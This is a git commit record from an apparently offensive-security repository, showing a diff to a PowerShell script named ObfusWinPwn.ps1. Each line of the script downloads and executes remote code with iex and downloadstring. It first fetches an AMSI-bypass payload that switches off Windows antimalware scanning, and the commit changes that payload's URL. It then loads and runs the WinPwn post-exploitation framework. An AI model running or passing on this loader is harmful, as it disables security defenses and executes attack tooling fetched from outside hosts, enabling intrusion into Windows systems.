8a4ef49eb6e4eda7547674ca8ab06c32562adc46
S3cur3Th1sSh1t <27858067+S3cur3Th1sSh1t@users.noreply.github.com>
2021-06-17 09:01:00 +0200

    Update ObfusWinPwn.ps1

--- ObfusWinPwn.ps1
+++ ObfusWinPwn.ps1
@@ -1,3 +1,3 @@
-iex(new-object net.webclient).downloadstring('https://amsi-fail.azurewebsites.net/api/Generate')
+iex(new-object net.webclient).downloadstring('https://amsifail.flangvik.workers.dev/api/Generate')
 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
 WinPwn
